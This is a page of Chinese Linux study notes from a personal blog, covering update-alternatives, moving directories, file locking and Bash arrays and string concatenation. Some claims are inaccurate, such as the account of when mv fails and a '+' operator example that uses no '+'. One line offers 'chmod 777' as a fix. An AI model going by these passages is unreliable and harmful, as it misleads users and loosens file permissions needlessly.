<h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><h4 id="1-安装备选项："><a href="#1-安装备选项：" class="headerlink" title="1. 安装备选项："></a>1. 安装备选项：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --install /usr/bin/editor editor /usr/bin/nano 50</span><br><span class="line"><span class="built_in">sudo</span> update-alternatives --install /usr/bin/editor editor /usr/bin/vim.basic 30</span><br></pre></td></tr></table></figure>

<h4 id="2-配置默认备选项："><a href="#2-配置默认备选项：" class="headerlink" title="2. 配置默认备选项："></a>2. 配置默认备选项：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --config editor</span><br></pre></td></tr></table></figure>

<p>用户可以选择默认的编辑器。</p>
<h4 id="3-显示备选项信息："><a href="#3-显示备选项信息：" class="headerlink" title="3. 显示备选项信息："></a>3. 显示备选项信息：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --display editor</span><br></pre></td></tr></table></figure>

<p>显示与编辑器相关的备选项信息。</p>
<h4 id="4-删除备选项："><a href="#4-删除备选项：" class="headerlink" title="4. 删除备选项："></a>4. 删除备选项：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --remove editor /usr/bin/nano</span><br></pre></td></tr></table></figure>

<p>从备选项列表中删除 Nano 编辑器。</p>
<h3 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h3><ul>
<li>使用 <code>sudo</code> 或者在具有足够权限的用户下运行命令，因为修改备选项可能需要超级用户权限。</li>
<li>在某些系统上，<code>update-alternatives</code> 可能不适用于所有软件。它通常用于系统软件和一些常见的命令。</li>
<li>具体备选项的名称、路径和优先级等参数可能因软件而异，具体使用时需要参考软件的文档或手册。</li>
</ul>
<p>这是 <code>update-alternatives</code> 命令的基本概述，具体的使用方法和备选项名称会根据不同的软件而有所不同。可以通过 <code>man update-alternatives</code> 命令查看完整的命令手册。</p>
<h2 id="linux-update-alternatives命令-常用技巧"><a href="#linux-update-alternatives命令-常用技巧" class="headerlink" title="linux update-alternatives命令 常用技巧"></a>linux update-alternatives命令 常用技巧</h2><p><code>update-alternatives</code> 命令是一个强大的工具，以下是一些在使用该命令时的常用技巧：</p>
<ol>
<li><p><strong>查看当前备选项配置：</strong></p>
<p>使用 <code>--display</code> 选项可以查看当前备选项的配置信息，包括备选项的名称、路径、优先级等。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --display &lt;name-of-alternative&gt;</span><br></pre></td></tr></table></figure>

<p>例如，查看 Java 的备选项配置：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --display java</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>安装新备选项：</strong></p>
<p>使用 <code>--install</code> 选项可以添加新的备选项。例如，安装一个新版本的 Java：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --install /usr/bin/java java /usr/java/jdk1.11.0/bin/java 2</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>配置默认备选项：</strong></p>
<p>使用 <code>--config</code> 选项可以选择默认的备选项。例如，选择默认的 Java 版本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --config java</span><br></pre></td></tr></table></figure>

<p>用户将会看到一个菜单，可以选择要使用的 Java 版本。</p>
</li>
<li><p><strong>手动更改备选项路径：</strong></p>
<p>在某些情况下，你可能需要手动更改备选项的路径。可以直接编辑 <code>/etc/alternatives/</code> 目录下对应备选项的符号链接，或者使用 <code>--set</code> 选项：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --<span class="built_in">set</span> &lt;name-of-alternative&gt; &lt;alternative-path&gt;</span><br></pre></td></tr></table></figure>

<p>例如，手动设置 Java 的路径：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --<span class="built_in">set</span> java /usr/java/jdk1.11.0/bin/java</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>删除不需要的备选项：</strong></p>
<p>使用 <code>--remove</code> 选项可以从备选项列表中删除不再需要的备选项：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --remove &lt;name-of-alternative&gt; &lt;alternative-path&gt;</span><br></pre></td></tr></table></figure>

<p>例如，删除不再需要的 Java 版本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --remove java /usr/java/jdk1.8.0_171/bin/java</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>查看已安装备选项的列表：</strong></p>
<p>使用 <code>--list</code> 选项可以列出某个备选项的所有可选项：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --list &lt;name-of-alternative&gt;</span><br></pre></td></tr></table></figure>

<p>例如，列出所有安装的 Java 版本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --list java</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>通过脚本自动配置备选项：</strong></p>
<p>如果你需要在脚本中自动配置备选项，可以使用 <code>--auto</code> 选项：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --auto &lt;name-of-alternative&gt;</span><br></pre></td></tr></table></figure>

<p>这样可以根据预设规则自动选择默认备选项。</p>
</li>
</ol>
<p>这些技巧可以帮助你更灵活地管理系统上的备选项，特别是当你需要安装、配置或更新多个版本的软件时。在使用 <code>update-alternatives</code> 时，请确保谨慎操作，以免影响系统稳定性。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Linux/linux_5_%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/2024-05-22-5_1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Linux/linux_5_%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/2024-05-22-5_1/" class="post-title-link" itemprop="url">5_1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>linux系统下常见的问题及其解决方法</li>
</ul>
<h2 id="mv-目录非空"><a href="#mv-目录非空" class="headerlink" title="mv 目录非空"></a>mv 目录非空</h2><p>当你尝试使用 <code>mv</code> 命令移动一个非空目录时，你会发现 <code>mv</code> 只能在同一文件系统中移动目录，而不能跨文件系统移动非空目录。如果你确实需要移动一个非空目录，可以尝试以下方法：</p>
<ol>
<li><p><strong>使用 <code>rsync</code> 命令</strong>：<br><code>rsync</code> 是一个功能强大的工具，可以用于将文件和目录从一个位置同步到另一个位置。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avz /path/to/source/directory /path/to/destination</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>使用 <code>cp</code> 命令复制然后删除原目录</strong>：<br>如果 <code>rsync</code> 不可用，你可以先使用 <code>cp</code> 命令递归复制目录，然后删除原目录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r /path/to/source/directory /path/to/destination</span><br><span class="line"><span class="built_in">rm</span> -rf /path/to/source/directory</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>使用 <code>tar</code> 命令打包和解包</strong>：<br>你可以使用 <code>tar</code> 命令先将目录打包，然后将包解压到目标位置。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -czf directory.tar.gz -C /path/to/source directory</span><br><span class="line"><span class="built_in">mv</span> directory.tar.gz /path/to/destination</span><br><span class="line"><span class="built_in">cd</span> /path/to/destination</span><br><span class="line">tar -xzf directory.tar.gz</span><br><span class="line"><span class="built_in">rm</span> directory.tar.gz</span><br></pre></td></tr></table></figure></li>
</ol>
<p>你可以选择最适合你情况的方法来移动非空目录。</p>
<h2 id="ubuntu-文件加个锁是什么意思"><a href="#ubuntu-文件加个锁是什么意思" class="headerlink" title="ubuntu 文件加个锁是什么意思"></a>ubuntu 文件加个锁是什么意思</h2><p>在 Ubuntu 中,给文件加锁通常有以下几种含义:</p>
<ol>
<li><p>权限锁定:</p>
<ul>
<li>通过修改文件的权限,限制其他用户对该文件的访问和操作。</li>
<li>可以使用 <code>chmod</code> 命令来设置文件的读、写、执行权限。</li>
</ul>
</li>
<li><p>文件锁定:</p>
<ul>
<li>在多用户环境下,某个用户正在编辑一个文件时,可以对该文件进行锁定,防止其他用户同时编辑该文件。</li>
<li>常见的文件编辑器如 gedit、vim 等都支持文件锁定功能。</li>
</ul>
</li>
<li><p>加密锁定:</p>
<ul>
<li>使用加密技术对文件进行加密,只有拥有正确密钥的用户才能访问和编辑该文件。</li>
<li>Ubuntu 自带的加密文件系统 eCryptfs 就可以实现这种加密锁定。</li>
</ul>
</li>
<li><p>共享锁定:</p>
<ul>
<li>在网络共享环境下,可以对文件设置共享锁定,限制其他用户的访问权限。</li>
<li>这种锁定通常由文件服务器或共享服务来管理和实现。</li>
</ul>
</li>
</ol>
<p>总之,给 Ubuntu 中的文件加锁,主要是为了保护文件的安全性和完整性,防止未经授权的访问和修改。具体使用哪种锁定方式,需要根据实际需求和使用场景来决定。</p>
<ul>
<li>通过命令 chmod 777 destination 修改文件权限即可</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Linux/shell_2_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/2024-05-22-shell_2_1_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Linux/shell_2_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/2024-05-22-shell_2_1_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">shell_2_1_常用技巧</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>shell脚本编程的常用方法</li>
</ul>
<h2 id="linux-shell-创建数组并在for循环中向数组添加元素"><a href="#linux-shell-创建数组并在for循环中向数组添加元素" class="headerlink" title="linux shell 创建数组并在for循环中向数组添加元素"></a>linux shell 创建数组并在for循环中向数组添加元素</h2><p>在 Bash 中，你可以在 <code>for</code> 循环中向数组添加元素。以下是一个示例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个空数组</span></span><br><span class="line">my_array=()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 for 循环中向数组添加元素</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..5&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    my_array+=(<span class="string">&quot;<span class="variable">$i</span>&quot;</span>)</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印数组中的所有元素</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;my_array[@]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$item</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>在这个示例中，我们首先创建了一个空数组 <code>my_array</code>。然后，在 <code>for</code> 循环中，我们使用 <code>+=</code> 运算符向数组添加了 1 到 5 的数字。最后，我们使用另一个 <code>for</code> 循环遍历数组并打印出所有的元素。</p>
<p>这样做会将每个数字作为一个独立的数组元素添加到数组中。</p>
<h2 id="linux-shell-创建数组"><a href="#linux-shell-创建数组" class="headerlink" title="linux shell 创建数组"></a>linux shell 创建数组</h2><p>在 Bash 中创建数组很简单，只需在变量名前加上 <code>()</code> 并用空格分隔元素即可。以下是一个示例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个数组</span></span><br><span class="line">my_array=(<span class="string">&quot;apple&quot;</span> <span class="string">&quot;banana&quot;</span> <span class="string">&quot;orange&quot;</span> <span class="string">&quot;grape&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印数组中的所有元素</span></span><br><span class="line"><span class="keyword">for</span> fruit <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;my_array[@]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$fruit</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>这个脚本创建了一个名为 <code>my_array</code> 的数组，其中包含了几种水果。然后，通过 <code>for</code> 循环遍历数组中的每个元素，并将其打印出来。</p>
<p>你也可以在创建数组后，通过索引访问和修改数组中的元素。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 访问数组元素</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;my_array[0]&#125;</span>&quot;</span>  <span class="comment"># 输出第一个元素 &quot;apple&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改数组元素</span></span><br><span class="line">my_array[1]=<span class="string">&quot;pear&quot;</span>     <span class="comment"># 将第二个元素修改为 &quot;pear&quot;</span></span><br></pre></td></tr></table></figure>

<p>这些都是 Bash 中创建和操作数组的基本方法。</p>
<h2 id="linux-shell脚本-获取指定目录下的所有文件名并依次判断是文件还是目录"><a href="#linux-shell脚本-获取指定目录下的所有文件名并依次判断是文件还是目录" class="headerlink" title="linux shell脚本 获取指定目录下的所有文件名并依次判断是文件还是目录"></a>linux shell脚本 获取指定目录下的所有文件名并依次判断是文件还是目录</h2><p>你可以通过 <code>for</code> 循环遍历指定目录下的所有文件和目录，并使用 <code>test</code> 命令检查每个项目是文件还是目录。以下是一个示例脚本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定目录路径</span></span><br><span class="line">directory=<span class="string">&quot;/path/to/directory&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取目录下所有文件和目录名，并遍历</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$directory</span>&quot;</span>/*</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="comment"># 判断是否为文件</span></span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$item</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$item</span> 是一个文件&quot;</span></span><br><span class="line">    <span class="comment"># 判断是否为目录</span></span><br><span class="line">    <span class="keyword">elif</span> [ -d <span class="string">&quot;<span class="variable">$item</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$item</span> 是一个目录&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$item</span> 不是文件也不是目录&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>这个脚本会遍历指定目录下的所有文件和目录，并输出相应的信息。你可以根据需要修改 <code>directory</code> 变量来指定不同的目录路径。</p>
<h2 id="linux-shell脚本-获取指定目录下的所有文件名并保存到数组"><a href="#linux-shell脚本-获取指定目录下的所有文件名并保存到数组" class="headerlink" title="linux shell脚本 获取指定目录下的所有文件名并保存到数组"></a>linux shell脚本 获取指定目录下的所有文件名并保存到数组</h2><p>你可以编写一个 shell 脚本来获取指定目录下的所有文件名，并将它们保存到一个数组中。以下是一个示例脚本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定目录路径</span></span><br><span class="line">directory=<span class="string">&quot;/path/to/directory&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取目录下所有文件名，并保存到数组</span></span><br><span class="line">file_list=($(<span class="built_in">ls</span> <span class="string">&quot;<span class="variable">$directory</span>&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印数组中的所有文件名</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;file_list[@]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$file</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>将上述脚本保存为一个文件，比如 <code>list_files.sh</code>，然后赋予执行权限：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x list_files.sh</span><br></pre></td></tr></table></figure>

<p>最后，运行该脚本即可：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./list_files.sh</span><br></pre></td></tr></table></figure>

<p>这个脚本会将指定目录下的所有文件名保存到 <code>file_list</code> 数组中，并打印出来。你可以根据需要修改 <code>directory</code> 变量来指定不同的目录路径。</p>
<h2 id="linux-shell-字符串拼接"><a href="#linux-shell-字符串拼接" class="headerlink" title="linux shell 字符串拼接"></a>linux shell 字符串拼接</h2><p>在Linux Shell中，你可以使用不同的方法来进行字符串拼接，具体取决于你使用的Shell（例如，Bash、Zsh、Fish等）。以下是一些常见的方法：</p>
<ol>
<li><p>使用<code>+</code>操作符（仅限Bash和Zsh）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&quot;Hello, &quot;</span></span><br><span class="line">str2=<span class="string">&quot;world!&quot;</span></span><br><span class="line">result=<span class="string">&quot;$str1<span class="variable">$str2</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>这将会输出：<code>Hello, world!</code></p>
</li>
<li><p>使用<code>$&#123;&#125;</code>来拼接字符串（适用于大多数Shell）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&quot;Hello, &quot;</span></span><br><span class="line">str2=<span class="string">&quot;world!&quot;</span></span><br><span class="line">result=<span class="string">&quot;<span class="variable">$&#123;str1&#125;</span><span class="variable">$&#123;str2&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>输出与上述相同。</p>
</li>
<li><p>使用<code>printf</code>函数来拼接字符串（适用于大多数Shell）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&quot;Hello, &quot;</span></span><br><span class="line">str2=<span class="string">&quot;world!&quot;</span></span><br><span class="line">result=$(<span class="built_in">printf</span> <span class="string">&quot;%s%s&quot;</span> <span class="string">&quot;<span class="variable">$str1</span>&quot;</span> <span class="string">&quot;<span class="variable">$str2</span>&quot;</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>输出与上述相同。</p>
</li>
<li><p>使用命令替换来拼接字符串（适用于大多数Shell）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&quot;Hello, &quot;</span></span><br><span class="line">str2=<span class="string">&quot;world!&quot;</span></span><br><span class="line">result=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;str1&#125;</span><span class="variable">$&#123;str2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>输出与上述相同。</p>
</li>
<li><p>在echo中直接拼接字符串：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&quot;Hello, &quot;</span></span><br><span class="line">str2=<span class="string">&quot;world!&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;str1&#125;</span><span class="variable">$&#123;str2&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>这将直接输出拼接后的字符串。</p>
</li>
<li><p>使用Here Document（适用于大多数Shell）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&quot;Hello, &quot;</span></span><br><span class="line">str2=<span class="string">&quot;world!&quot;</span></span><br><span class="line">result=$(<span class="built_in">cat</span> &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">$&#123;str1&#125;$&#123;str2&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>这种方法适用于多行字符串拼接。</p>
</li>
</ol>
<p>请注意，上述示例中的字符串拼接方法可以在大多数常见的Shell中使用，但可能会有一些细微的差异。确保根据你所使用的Shell来选择适当的方法。</p>
<h2 id="linux-bash-shell-字符串拼接"><a href="#linux-bash-shell-字符串拼接" class="headerlink" title="linux bash shell 字符串拼接"></a>linux bash shell 字符串拼接</h2><p>在Bash Shell中，你可以使用不同的方法来进行字符串拼接。以下是一些常见的方法：</p>
<ol>
<li>使用<code>$&#123;&#125;</code>来拼接字符串：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&quot;Hello, &quot;</span></span><br><span class="line">str2=<span class="string">&quot;world!&quot;</span></span><br><span class="line">result=<span class="string">&quot;<span class="variable">$&#123;str1&#125;</span><span class="variable">$&#123;str2&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>这将会输出：<code>Hello, world!</code></p>
<ol start="2">
<li>使用<code>+</code>操作符（仅限Bash 4.0及更高版本）：</li>
</ol>
